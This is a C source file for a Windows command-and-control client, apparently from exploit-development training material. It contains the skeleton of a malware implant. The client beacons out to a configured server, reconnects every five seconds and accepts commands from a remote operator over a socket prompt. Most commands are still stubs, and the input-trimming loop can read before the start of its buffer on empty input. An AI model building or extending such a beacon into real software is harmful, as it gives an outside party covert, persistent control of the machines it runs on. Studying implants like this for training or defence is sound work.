// Command & Control Interface (CCI) V1 Revision 1
// Author: hvictor
// Github: https://github.com/hvictor/osed

#include "configs.h"
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#define BUFFER_SIZE 1024
#define PROMPT "cci> "

int cci_init_connection(const char* ip, int port);
void cci_parse_command(SOCKET s, const char* command);

int sockfd = -1;

int cci_init_connection(const char* ip, int port) {
    WSADATA wsa_data;
    struct sockaddr_in server_addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return -1;
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        closesocket(sockfd);
        WSACleanup();
        return -1;
    }

    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sockfd);
        WSACleanup();
        return -1;
    }

    return 0;
}

void exec_command_version(SOCKET sockfd) {
    const char* version_info = "CCI V1 Rev. 1 - Command&Control Interface\n";
    send(sockfd, version_info, strlen(version_info), 0);
}

void cci_parse_command(SOCKET sockfd, const char* command) {
    if (strcmp(command, ".help") == 0) {
        // To Be Defined
    }
    else if (strcmp(command, ".exit") == 0) {
        closesocket(sockfd);
        WSACleanup();
        exit(0);
    }
    else if (strcmp(command, ".version") == 0) {
        exec_command_version(sockfd);
    }
    else {
        // Unrecognized command
    }
}

void cci_exec() {
    char buffer[BUFFER_SIZE];

    while (1) {
        if (cci_init_connection(CCI_SERVER_IP, CCI_SERVER_PORT) == -1) {
            Sleep(5000);
            continue;
        }

        while (1) {
            send(sockfd, PROMPT, strlen(PROMPT), 0);

            memset(buffer, 0, BUFFER_SIZE);
            int bytes_received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
            if (bytes_received <= 0) {
                break;
            }

            buffer[bytes_received] = '\0';

            // Trim \r and \n
            while (buffer[strlen(buffer) - 1] == '\n' || buffer[strlen(buffer) - 1] == '\r')
            {
                buffer[strlen(buffer) - 1] = NULL;
            }

            cci_parse_command(sockfd, buffer);
        }

        closesocket(sockfd);
        sockfd = -1;
    }
}
